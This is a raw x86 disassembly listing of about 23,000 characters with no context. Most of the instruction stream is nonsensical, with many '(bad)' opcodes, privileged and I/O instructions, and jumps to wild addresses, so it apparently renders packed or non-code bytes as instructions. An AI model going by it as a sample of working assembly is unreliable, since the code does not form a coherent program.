  4305da:	mov    dl,bl
  4305dc:	adc    esi,edx
  4305de:	jb     0x4305ae
  4305e0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4305e6:	in     al,dx
  4305e7:	jge    0x4305b4
  4305e9:	sub    ecx,DWORD PTR [ebp+0x3b]
  4305ec:	mov    esi,DWORD PTR [edi-0x24]
  4305ef:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  4305f6:	mov    BYTE PTR [ebx-0x34b20729],cl
  4305fc:	mov    edx,ebx
  4305fe:	in     al,dx
  4305ff:	(bad)  
  430600:	ror    esi,cl
  430602:	push   ebp
  430603:	scas   eax,DWORD PTR es:[edi]
  430604:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43060a:	fwait
  43060b:	sub    esi,DWORD PTR [edx]
  43060d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430613:	lods   al,BYTE PTR ds:[esi]
  430614:	xor    esp,DWORD PTR [ebx]
  430616:	add    ecx,DWORD PTR [ebp-0x18]
  430619:	mov    edi,DWORD PTR [ebp-0x8]
  43061c:	mov    bl,cl
  43061e:	cmp    dl,bl
  430620:	jb     0x4305f0
  430622:	add    dh,dl
  430624:	dec    ebp
  430625:	scas   eax,DWORD PTR es:[edi]
  430626:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  43062c:	shr    DWORD PTR [ebx],cl
  43062e:	into   
  43062f:	cmp    edx,esi
  430631:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  430637:	dec    ebp
  430638:	dec    ebp
  430639:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  43063f:	retf   
  430640:	xor    edx,esi
  430642:	add    ecx,esi
  430644:	imul   ecx,edx
  430647:	mov    DWORD PTR [ebp+0x8],edx
  43064a:	xor    ecx,DWORD PTR [ebp+0x2b]
  43064d:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  430653:	add    esi,DWORD PTR [ebx]
  430655:	mov    ah,0x3
  430657:	inc    ebp
  430658:	rdtsc  
  43065a:	xlat   BYTE PTR ds:[ebx]
  43065b:	pushf  
  43065c:	jge    0x4305e7
  43065e:	xor    ebx,esp
  430660:	sub    eax,DWORD PTR [ebp-0x73]
  430663:	(bad)  
  430664:	cmp    al,al
  430666:	jb     0x4305ed
  430668:	add    al,bh
  43066a:	ror    DWORD PTR [ebp-0x7a],1
  43066d:	xor    edi,edi
  43066f:	add    edi,edi
  430671:	jmp    0x4306c0
  430673:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430679:	dec    ebp
  43067a:	into   
  43067b:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430681:	fwait
  430682:	shl    DWORD PTR [edx],cl
  430684:	retf   0x5588
  430687:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43068d:	add    eax,DWORD PTR [eax]
  43068f:	call   0x8ace5be1
  430694:	fcom   DWORD PTR [ecx]
  430696:	retf   
  430697:	jb     0x4306fe
  430699:	add    ch,cl
  43069b:	dec    ebp
  43069c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  4306a2:	dec    ebp
  4306a3:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  4306a9:	jge    0x430679
  4306ab:	mov    BYTE PTR [edi+0xf723b3a],ch
  4306b1:	add    cl,dh
  4306b3:	dec    ebp
  4306b4:	dec    DWORD PTR [ebx-0x2c031b75]
  4306ba:	adc    BYTE PTR [ebp+0x1],0x8b
  4306be:	add    ah,bl
  4306c0:	jge    0x43064e
  4306c2:	push   0xffffff9b
  4306c4:	push   0x8b3032
  4306c9:	shl    BYTE PTR [ebp+0x55],0x6a
  4306cd:	xor    edi,edi
  4306cf:	xor    edx,DWORD PTR [ebx+eax*1]
  4306d2:	inc    ebp
  4306d3:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4306d9:	dec    ebp
  4306da:	or     BYTE PTR [ecx+0x4dcce883],cl
  4306e0:	jbe    0x43066d
  4306e2:	mov    esp,eax
  4306e4:	ror    bl,1
  4306e6:	enter  0x14ce,0xaf
  4306ea:	dec    DWORD PTR [ebx-0x2cef13f8]
  4306f0:	push   ebp
  4306f1:	retf   0x5540
  4306f4:	push   ebp
  4306f5:	mov    esi,DWORD PTR [edx-0x18]
  4306f8:	mov    edx,ebx
  4306fa:	cld    
  4306fb:	(bad)  
  4306fc:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430703:	sti    
  430704:	add    dh,cl
  430706:	push   0xffffff94
  430708:	call   FWORD PTR [ebx+0x3b5032d0]
  43070e:	mov    ecx,DWORD PTR [edi]
  430710:	enter  0x455e,0xff
  430714:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43071a:	xor    esi,DWORD PTR [ebx]
  43071c:	mov    DWORD PTR [ebx],0xcace0f9c
  430722:	aas    
  430723:	push   ebp
  430724:	inc    ebp
  430725:	xor    edx,esi
  430727:	add    edx,esi
  430729:	mov    eax,DWORD PTR [ebx]
  43072b:	(bad)  
  43072c:	jmp    0x4306ba
  43072e:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  430734:	rol    ah,1
  430736:	mov    esi,0xf133104d
  43073b:	mov    edx,0xff388d80
  430740:	mov    dh,0xd1
  430742:	cmp    edx,DWORD PTR [ebp+0xf]
  430745:	mov    eax,DWORD PTR [edx-0x28]
  430748:	add    BYTE PTR [ebp-0x75],bh
  43074b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  430752:	fwait
  430753:	retf   0x8632
  430756:	cmp    ebp,0x8
  430759:	call   ebx
  43075b:	inc    ebp
  43075c:	inc    ebp
  43075d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  430763:	mov    esi,DWORD PTR [ecx]
  430765:	int3   
  430766:	pushf  
  430767:	add    al,0xc7
  430769:	add    al,al
  43076b:	add    bl,al
  43076d:	(bad)  
  43076e:	clc    
  43076f:	int3   
  430770:	inc    ebp
  430771:	add    BYTE PTR [ecx],dh
  430773:	push   eax
  430774:	pushf  
  430775:	mov    edi,eax
  430777:	enter  0xc008,0x85
  43077b:	aas    
  43077c:	clc    
  43077d:	gs inc ebp
  43077f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430785:	push   ss
  430786:	xor    ecx,DWORD PTR [ebp+0x3]
  430789:	sub    edx,DWORD PTR [ecx-0x76]
  43078c:	dec    ebp
  43078d:	add    DWORD PTR [ebx+0x88d845],ecx
  430793:	mov    esi,DWORD PTR [ebx]
  430795:	or     BYTE PTR [ebx],al
  430797:	cmp    edx,DWORD PTR [ecx-0x34]
  43079a:	dec    ebp
  43079b:	out    dx,eax
  43079c:	xor    eax,DWORD PTR [ebp+0x3]
  43079f:	mov    edx,DWORD PTR [ecx-0x28]
  4307a2:	dec    ebp
  4307a3:	add    BYTE PTR [ebx],dh
  4307a5:	push   0x518003
  4307aa:	push   eax
  4307ab:	add    BYTE PTR [ebx-0x300748b],cl
  4307b1:	sbb    BYTE PTR [ebp+0x45],cl
  4307b4:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  4307ba:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4307c0:	dec    ebp
  4307c1:	inc    ebp
  4307c2:	xor    edx,esi
  4307c4:	add    edx,esi
  4307c6:	push   ecx
  4307c7:	(bad)  
  4307c8:	dec    ebp
  4307c9:	mov    al,ds:0xc5d83dff
  4307ce:	retf   
  4307cf:	(bad)  
  4307d0:	into   
  4307d1:	sub    bh,bh
  4307d3:	dec    esp
  4307d4:	adc    al,0x9c
  4307d6:	inc    ebp
  4307d7:	push   ebp
  4307d8:	test   DWORD PTR [edi],ecx
  4307da:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  4307e1:	jmp    0xc9bc16f5
  4307e6:	add    cl,dl
  4307e8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4307f2:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4307f8:	rol    BYTE PTR [eax],0x54
  4307fb:	clc    
  4307fc:	gs jb  0x430806
  4307ff:	mov    eax,DWORD PTR [ebp-0x30]
  430802:	xor    al,0x40
  430804:	sub    al,0xc7
  430806:	mov    al,ah
  430808:	add    DWORD PTR [ebp+0x4534f845],eax
  43080e:	sub    al,0x80
  430810:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430817:	mov    ch,0xff
  430819:	clc    
  43081a:	add    DWORD PTR [ebp+0x60],0x3d
  43081e:	call   FWORD PTR [eax+eax*1-0x277a77]
  430825:	inc    ebp
  430826:	dec    DWORD PTR [ebx-0x3427f701]
  43082c:	test   esi,ecx
  43082e:	dec    DWORD PTR [ebx-0x7f8a3701]
  430834:	push   eax
  430835:	add    DWORD PTR [ebp+0x0],eax
  430838:	dec    ebx
  43083a:	or     al,0xce
  43083c:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  430843:	into   
  430844:	add    BYTE PTR [ebx-0x34ff2000],cl
  43084a:	mov    esi,ecx
  43084c:	sar    bh,0x45
  43084f:	adc    al,0x8b
  430851:	clc    
  430852:	fadd   DWORD PTR [ebp+0x0]
  430855:	mov    ebp,DWORD PTR [edx+0x8]
  430858:	push   edi
  430859:	adc    BYTE PTR [eax+0x1],0x83
  43085d:	add    al,al
  43085f:	retf   
  430860:	mov    ecx,esi
  430862:	cld    
  430863:	mov    eax,DWORD PTR [eax+0xcb01c8]
  430869:	into   
  43086a:	add    BYTE PTR [ebx+0x756ae000],cl
  430870:	jne    0x4308a5
  430872:	inc    DWORD PTR [ebx]
  430874:	rcl    BYTE PTR [ecx+0x50],1
  430877:	push   eax
  430878:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  43087e:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430885:	sar    bh,0x84
  430888:	or     BYTE PTR [ebx],al
  43088a:	push   eax
  43088b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430891:	pushf  
  430892:	xor    edi,eax
  430894:	pushf  
  430895:	mov    ah,0x89
  430897:	test   esp,ebp
  430899:	clc    
  43089a:	inc    ebp
  43089b:	inc    ebp
  43089c:	mov    DWORD PTR [eax+eax*8],esi
  43089f:	sub    al,0x32
  4308a1:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  4308a8:	dec    ebp
  4308a9:	xor    eax,DWORD PTR gs:[edi+0x3]
  4308ad:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  4308b3:	xor    eax,DWORD PTR gs:[edi+0x3]
  4308b7:	or     DWORD PTR [ecx+0x45ff085c],0x0
  4308be:	shl    DWORD PTR [ebp-0x380064],1
  4308c4:	enter  0x858d,0x60
  4308c8:	clc    
  4308c9:	inc    DWORD PTR [ebp+0x50]
  4308cc:	cmp    al,0x75
  4308ce:	pushf  
  4308cf:	(bad)  
  4308d0:	(bad)  
  4308d1:	pop    esp
  4308d2:	lods   al,BYTE PTR ds:[esi]
  4308d3:	inc    DWORD PTR [ebp+0x4508f8ff]
  4308d9:	mov    edi,DWORD PTR [esi]
  4308db:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  4308e2:	test   DWORD PTR [edi-0x8],edx
  4308e5:	sbb    al,0x45
  4308e7:	add    BYTE PTR [eax],bh
  4308e9:	push   0x8b809c
  4308ee:	loopne 0x430935
  4308f0:	push   ebp
  4308f1:	mov    esi,DWORD PTR [ebx]
  4308f3:	cld    
  4308f4:	add    eax,DWORD PTR [eax+0xf013b]
  4308fa:	adc    al,0x0
  4308fc:	add    bh,bh
  4308fe:	jmp    0xc00a1b
  430903:	add    BYTE PTR [ebp+0x45],cl
  430906:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  43090c:	dec    ebp
  43090d:	push   0x38033
  430912:	cmp    eax,DWORD PTR [eax]
  430914:	unpcklps xmm7,xmm0
  430917:	jne    0x430919
  430919:	dec    DWORD PTR [ebx+0x5545c818]
  43091f:	mov    DWORD PTR [ebx],esi
  430921:	shl    BYTE PTR [ebx],1
  430923:	inc    ebp
  430924:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  43092a:	retf   0x5575
  43092d:	dec    DWORD PTR [ebx-0x5ba13e8]
  430933:	(bad)  
  430934:	stc    
  430935:	loopne 0x430943
  430937:	test   DWORD PTR [ebp-0x8],ecx
  43093a:	xor    eax,DWORD PTR [ebp+0x3]
  43093d:	mov    ebp,ecx
  43093f:	rol    BYTE PTR [eax],1
  430941:	inc    ebp
  430942:	add    BYTE PTR [eax-0x7747ab3],bh
  430948:	clc    
  430949:	inc    ebp
  43094a:	retf   
  43094b:	mov    edx,ebx
  43094d:	loopne 0x430925
  43094f:	retf   
  430950:	into   
  430951:	into   
  430952:	scas   eax,DWORD PTR es:[edi]
  430953:	dec    ebp
  430954:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  43095a:	sub    ecx,esi
  43095c:	cmp    ecx,DWORD PTR [ebp+0x77]
  43095f:	(bad)  
  430960:	mov    edi,eax
  430962:	enter  0x8985,0xf8
  430966:	add    BYTE PTR [ebp-0x75],al
  430969:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430970:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430976:	(bad)  
  430978:	retf   0x559c
  43097b:	(bad)  
  43097c:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430983:	inc    ebp
  430984:	add    eax,0xeb9c4d3f
  430989:	(bad)  
  43098a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430990:	xor    ecx,DWORD PTR [ebp+0x33]
  430993:	mov    eax,DWORD PTR [ebx]
  430995:	in     al,dx
  430996:	add    ecx,ebx
  430998:	bswap  esi
  43099a:	retf   0x55d1
  43099d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  4309a3:	jmp    0x43099e
  4309a5:	add    BYTE PTR ds:0xebf44d8b,al
  4309ab:	push   ebp
  4309ac:	mov    ebp,DWORD PTR [ebx]
  4309ae:	mov    eax,0x33f8558b
  4309b3:	retf   
  4309b4:	xor    ecx,esi
  4309b6:	add    edx,ecx
  4309b8:	add    eax,DWORD PTR [edx+0xca010f]
  4309be:	push   ebp
  4309bf:	dec    ebp
  4309c0:	mov    ecx,DWORD PTR [ebx-0x34050714]
  4309c6:	stc    
  4309c7:	rol    DWORD PTR ds:0xebce4dd6,cl
  4309cd:	scas   eax,DWORD PTR es:[edi]
  4309ce:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  4309d4:	xor    ebp,DWORD PTR [ebx]
  4309d6:	xor    edi,DWORD PTR [ebx]
  4309d8:	add    esi,DWORD PTR [edi+0x3]
  4309db:	mov    ecx,DWORD PTR [edi]
  4309dd:	clc    
  4309de:	retf   0x55cb
  4309e1:	into   
  4309e2:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  4309e9:	test   al,0x4d
  4309eb:	push   ebp
  4309ec:	jbe    0x430a21
  4309ee:	mov    esi,DWORD PTR [ebx]
  4309f0:	mov    al,0x3
  4309f2:	push   ebp
  4309f3:	add    esi,DWORD PTR [ebx]
  4309f5:	rdpmc  
  4309f7:	retf   0x5503
  4309fa:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430a00:	dec    ebp
  430a01:	stc    
  430a02:	mov    ecx,DWORD PTR [eax]
  430a04:	or     BYTE PTR [ebp+0x4d],cl
  430a07:	jmp    0x1370a97
  430a0c:	dec    ebp
  430a0d:	dec    ebp
  430a0e:	(bad)  
  430a0f:	mov    esp,esp
  430a11:	clc    
  430a12:	test   ebx,ecx
  430a14:	clc    
  430a15:	ror    DWORD PTR [ebp-0x2a],cl
  430a18:	mov    esi,ecx
  430a1a:	lock scas eax,DWORD PTR es:[edi]
  430a1c:	inc    ebp
  430a1d:	mov    esi,DWORD PTR [ebx]
  430a1f:	hlt    
  430a20:	pushf  
  430a21:	jge    0x4309ae
  430a23:	sub    esp,esp
  430a25:	cmp    ecx,ebx
  430a27:	ja     0x4309f7
  430a29:	mov    ebp,DWORD PTR [eax-0x58]
  430a2c:	dec    ebp
  430a2d:	xor    ecx,DWORD PTR [di+0x3]
  430a31:	mov    ebp,eax
  430a33:	clc    
  430a34:	push   ebp
  430a35:	retf   
  430a36:	mov    dl,bl
  430a38:	adc    esi,edx
  430a3a:	jb     0x430a0a
  430a3c:	add    BYTE PTR [edi-0xb7474b3],ch
  430a42:	lock jge 0x430a10
  430a45:	sub    ecx,DWORD PTR [ebp+0x3b]
  430a48:	mov    esi,DWORD PTR [edi-0x28]
  430a4b:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430a52:	mov    BYTE PTR [ebx-0x34b20729],cl
  430a58:	mov    edx,ebx
  430a5a:	lock (bad) 
  430a5c:	ror    esi,cl
  430a5e:	push   ebp
  430a5f:	scas   eax,DWORD PTR es:[edi]
  430a60:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430a66:	fwait
  430a67:	sub    esi,DWORD PTR [edx]
  430a69:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a70:	xor    esp,DWORD PTR [ebx]
  430a72:	add    ecx,DWORD PTR [ebp-0x18]
  430a75:	mov    edi,DWORD PTR [ebp-0x8]
  430a78:	mov    bl,cl
  430a7a:	cmp    dl,bl
  430a7c:	jb     0x430a4c
  430a7e:	add    dh,dl
  430a80:	dec    ebp
  430a81:	scas   eax,DWORD PTR es:[edi]
  430a82:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430a88:	shr    DWORD PTR [ebx],cl
  430a8a:	into   
  430a8b:	cmp    edx,esi
  430a8d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430a93:	dec    ebp
  430a94:	dec    ebp
  430a95:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430a9b:	retf   
  430a9c:	xor    edx,esi
  430a9e:	add    ecx,esi
  430aa0:	imul   ecx,edx
  430aa3:	mov    DWORD PTR [ebp+0x8],edx
  430aa6:	xor    ecx,DWORD PTR [ebp+0x2b]
  430aa9:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430aaf:	add    esi,DWORD PTR [ebx]
  430ab1:	rol    BYTE PTR [ebx],0x45
  430ab4:	rdtsc  
  430ab6:	xlat   BYTE PTR ds:[ebx]
  430ab7:	pushf  
  430ab8:	jge    0x430a43
  430aba:	xor    ebx,eax
  430abc:	sub    eax,DWORD PTR [ebp-0x73]
  430abf:	(bad)  
  430ac0:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430ac7:	dec    ebp
  430ac8:	xchg   BYTE PTR [ebx],dh
  430aca:	inc    DWORD PTR [ebx]
  430acc:	(bad)  
  430acd:	jmp    0x430b1c
  430acf:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430ad5:	dec    ebp
  430ad6:	into   
  430ad7:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430add:	fwait
  430ade:	shl    DWORD PTR [edx],cl
  430ae0:	retf   0x5588
  430ae3:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430ae9:	add    eax,DWORD PTR [eax]
  430aeb:	call   0x8ace603d
  430af0:	fcom   QWORD PTR [ecx]
  430af2:	retf   
  430af3:	jb     0x430b5a
  430af5:	add    ch,cl
  430af7:	dec    ebp
  430af8:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430afe:	dec    ebp
  430aff:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430b05:	jge    0x430ad5
  430b07:	mov    BYTE PTR [edi+0xf723b3a],ch
  430b0d:	add    cl,dh
  430b0f:	dec    ebp
  430b10:	dec    DWORD PTR [ebx-0x2c031b01]
  430b16:	inc    ebp
  430b17:	push   ebp
  430b18:	dec    DWORD PTR [ebx-0x73ff2734]
  430b1e:	lea    ebx,[ebx-0x7400cdac]
  430b24:	push   eax
  430b25:	mov    ah,0x45
  430b27:	push   ebp
  430b28:	mov    esi,DWORD PTR [ebx]
  430b2a:	les    esi,FWORD PTR [ebx]
  430b2c:	add    BYTE PTR [ebx],al
  430b2e:	inc    DWORD PTR [ebx]
  430b30:	mov    ecx,DWORD PTR [edi]
  430b32:	cld    
  430b33:	retf   0x4d80
  430b36:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430b3c:	jne    0x430ac9
  430b3e:	jmp    eax
  430b40:	ror    bl,1
  430b42:	or     cl,dh
  430b44:	add    BYTE PTR [edi-0xf2f7475],ch
  430b4a:	not    bl
  430b4c:	adc    al,0xca
  430b4e:	inc    ebp
  430b4f:	push   ebp
  430b50:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430b56:	push   0xaf80d6
  430b5b:	mov    eax,DWORD PTR [eax]
  430b5d:	in     al,0xff
  430b5f:	sti    
  430b60:	sbb    dh,cl
  430b62:	pop    esi
  430b63:	xchg   esp,eax
  430b64:	leave  
  430b65:	fwait
  430b66:	add    al,0x32
  430b68:	push   ebp
  430b69:	cmp    ebp,esp
  430b6b:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430b6f:	dec    DWORD PTR [ecx-0x740f0375]
  430b75:	push   ebp
  430b76:	cld    
  430b77:	xor    ebp,ebx
  430b79:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430b7f:	push   ebp
  430b80:	clc    
  430b81:	xor    esi,ecx
  430b83:	add    esi,DWORD PTR [ebp-0x75]
  430b86:	(bad)  
  430b87:	hlt    
  430b88:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430b8f:	mov    DWORD PTR [esi],eax
  430b91:	hlt    
  430b92:	(bad)  
  430b93:	dec    ebp
  430b94:	add    esi,DWORD PTR [ebx]
  430b96:	(bad)  
  430b97:	mov    edx,0xffc68d0a
  430b9c:	add    dl,cl
  430b9e:	leave  
  430b9f:	push   ebp
  430ba0:	push   ebp
  430ba1:	mov    ebp,esp
  430ba3:	fcom   QWORD PTR [ecx+0x7d]
  430ba6:	inc    ebp
  430ba7:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430bad:	iret   
  430bae:	cld    
  430baf:	retf   0x868f
  430bb2:	loopne 0x430bb1
  430bb4:	mov    edi,edi
  430bb6:	mov    esi,DWORD PTR [ebp-0x8]
  430bb9:	mov    esi,eax
  430bbb:	cld    
  430bbc:	jne    0x430b6e
  430bbe:	mov    BYTE PTR [ecx],0xa
  430bc1:	add    dh,al
  430bc3:	test   DWORD PTR [eax],ecx
  430bc5:	inc    esi
  430bc7:	inc    DWORD PTR [edi]
  430bc9:	mov    eax,esi
  430bcb:	cld    
  430bcc:	add    DWORD PTR [eax+0x901c6],eax
  430bd2:	leave  
  430bd3:	xor    BYTE PTR [ebp+0x45],dl
  430bd6:	in     al,dx
  430bd7:	mov    edx,DWORD PTR [ecx-0x40]
  430bda:	inc    ebp
  430bdb:	add    BYTE PTR [ecx-0x74000301],cl
  430be1:	int3   
  430be2:	cld    
  430be3:	jne    0x430b9d
  430be5:	call   0xcc1ef0
  430bea:	mov    esi,DWORD PTR [ebp-0x8]
  430bed:	test   eax,esi
  430bef:	je     0x430c66
  430bf1:	mov    eax,esi
  430bf3:	cld    
  430bf4:	add    al,0x80
  430bf6:	add    WORD PTR [ecx+0x0],ax
  430bfa:	fiadd  DWORD PTR [eax]
  430bfc:	mov    BYTE PTR [eax],0x3d
  430bff:	push   0xffffffc3
  430c01:	push   esi
  430c02:	mov    edx,DWORD PTR [eax+0x51]
  430c05:	pop    edi
  430c06:	lea    ebx,[ebx-0x8]
  430c09:	ret    0x45
  430c0c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430c12:	xchg   eax,edi
  430c14:	mov    DWORD PTR [ebp-0x75],ecx
  430c17:	push   esi
  430c18:	clc    
  430c19:	jne    0x430beb
  430c1b:	mov    ecx,0xf8450b0b
  430c20:	(bad)  
  430c21:	push   cs
  430c22:	or     BYTE PTR [ebp-0x3a],dh
  430c25:	cmp    eax,DWORD PTR [ecx]
  430c27:	pop    esi
  430c28:	(bad)  
  430c29:	or     al,0x5
  430c2b:	inc    eax
  430c2c:	leave  
  430c2d:	jmp    0x40cf:0x25564204
  430c34:	leave  
  430c35:	in     eax,dx
  430c36:	inc    DWORD PTR [eax-0x75]
  430c39:	fimul  DWORD PTR [ebx-0x228139be]
  430c3f:	inc    eax
  430c40:	nop
  430c41:	loopne 0x430c42
  430c43:	ret    
  430c44:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430c4a:	add    eax,0xff45e8f8
  430c4f:	push   esi
  430c50:	push   DWORD PTR [ebp-0x39]
  430c53:	mov    eax,0x7edda46
  430c58:	or     al,0x6
  430c5a:	push   DWORD PTR [ebp-0x3a]
  430c5d:	cmp    eax,DWORD PTR [edx]
  430c5f:	pop    esi
  430c60:	ret    
  430c61:	or     al,0x56
  430c63:	inc    ecx
  430c64:	push   ebp
  430c65:	jle    0x430c53
  430c67:	inc    edx
  430c68:	inc    ebp
  430c69:	int    0x1
  430c6b:	inc    ecx
  430c6c:	sub    BYTE PTR ds:0xe77541fc,ah
  430c72:	add    DWORD PTR [edx+0x1c],eax
  430c75:	retf   0xc38b
  430c78:	adc    al,0x8b
  430c7a:	xchg   edx,eax
  430c7b:	push   ecx
  430c7c:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430c82:	rcl    DWORD PTR [esi-0x9],cl
  430c85:	jne    0x430cd7
  430c87:	mov    eax,0x7c80ece
  430c8c:	rol    DWORD PTR [esi],cl
  430c8e:	div    DWORD PTR [ebp+0x50]
  430c91:	cmp    ecx,edx
  430c93:	pop    esi
  430c94:	dec    BYTE PTR [edx]
  430c96:	in     al,dx
  430c97:	inc    edx
  430c98:	sub    esp,ecx
  430c9a:	inc    eax
  430c9b:	(bad)  
  430c9c:	push   eax
  430c9d:	add    edx,DWORD PTR [eax-0x1f]
  430ca0:	push   edi
  430ca1:	add    dh,dh
  430ca3:	leave  
  430ca4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430ca8:	add    BYTE PTR [ecx+0x0],dl
  430cab:	inc    ebp
  430cac:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430cb2:	add    BYTE PTR [eax-0x7fbf448],bh
  430cb8:	add    al,0x2
  430cba:	jmp    0x57eb814
  430cbf:	jne    0x430ca9
  430cc1:	mov    eax,DWORD PTR [edx]
  430cc3:	or     BYTE PTR [eax],al
  430cc5:	inc    ecx
  430cc6:	stc    
  430cc7:	in     eax,dx
  430cc8:	ss inc eax
  430cca:	aas    
  430ccb:	out    0x7d,eax
  430ccd:	inc    ecx
  430cce:	mov    ebp,ecx
  430cd0:	lock ret 0x7d
  430cd4:	and    ecx,DWORD PTR [ebx-0x171777]
  430cda:	add    bh,bh
  430cdc:	aad    0xd7
  430cde:	add    dh,cl
  430ce0:	clts   
  430ce2:	(bad)  
  430ce3:	call   0xffce0be8
  430ce8:	hlt    
  430ce9:	iret   
  430cea:	jge    0x430cc2
  430cec:	rol    DWORD PTR [esi-0x80],cl
  430cef:	jmp    0x1c5bfc
  430cf4:	out    dx,al
  430cf5:	mov    eax,DWORD PTR [ebx]
  430cf7:	(bad)  
  430cf8:	pop    esi
  430cf9:	push   es
  430cfa:	cmp    al,0xe8
  430cfc:	sar    edi,0x8
  430cff:	inc    DWORD PTR [edi]
  430d01:	inc    esi
  430d02:	(bad)  
  430d03:	loopne 0x430d83
  430d05:	push   edi
  430d06:	push   cs
  430d07:	push   ebx
  430d08:	add    BYTE PTR [ebx+0x24008b56],cl
  430d0e:	add    BYTE PTR [ebp+0x50],al
  430d11:	push   eax
  430d12:	add    DWORD PTR [ebx+0x757d1834],ecx
  430d18:	sub    edx,DWORD PTR [esi-0x24]
  430d1b:	jne    0x430cd3
  430d1d:	lods   eax,DWORD PTR ds:[esi]
  430d1e:	mov    edx,DWORD PTR [edx-0x34]
  430d21:	dec    esi
  430d22:	out    0x83,eax
  430d24:	into   
  430d25:	push   edi
  430d27:	loopne 0x430cf7
  430d29:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430d2d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430d34:	rol    DWORD PTR [edx],0x8
  430d37:	mov    esp,ecx
  430d39:	cmp    DWORD PTR [ebx],0xc
  430d3c:	mov    esi,0x5001c0
  430d41:	push   eax
  430d42:	push   cs
  430d43:	push   eax
  430d44:	(bad)  
  430d45:	sub    edx,edi
  430d47:	push   esi
  430d48:	adc    al,0xcb
  430d4a:	ins    DWORD PTR es:[edi],dx
  430d4b:	mov    eax,0x203e8
  430d50:	add    al,ah
  430d52:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430d59:	add    dh,al
  430d5b:	add    ah,ch
  430d5d:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430d63:	pop    ecx
  430d64:	or     eax,ebx
  430d66:	cli    
  430d67:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430d6d:	lea    ebp,[ebx]
  430d6f:	mov    edx,DWORD PTR [edx-0x4]
  430d72:	dec    ecx
  430d73:	inc    ebp
  430d74:	shr    BYTE PTR [ebx],0x4b
  430d77:	and    al,0x0
  430d79:	(bad)  
  430d7a:	jne    0x430dc1
  430d7c:	pop    eax
  430d7d:	mov    al,0x5a
  430d7f:	call   0x1420fde
  430d84:	and    al,0x85
  430d86:	push   edx
  430d87:	add    BYTE PTR [eax+eax*1+0x0],ah
  430d8b:	dec    ebp
  430d8c:	mov    cl,0x23
  430d8e:	jmp    0x430d7c
  430d90:	mov    al,0xe7
  430d92:	call   0x1391080
  430d97:	shr    DWORD PTR [eax+ebx*2],cl
  430d9a:	lock (bad) 
  430d9c:	adc    eax,0x757f008d
  430da1:	out    0x58,eax
  430da3:	cmp    al,0x7
  430da5:	pop    edx
  430da6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
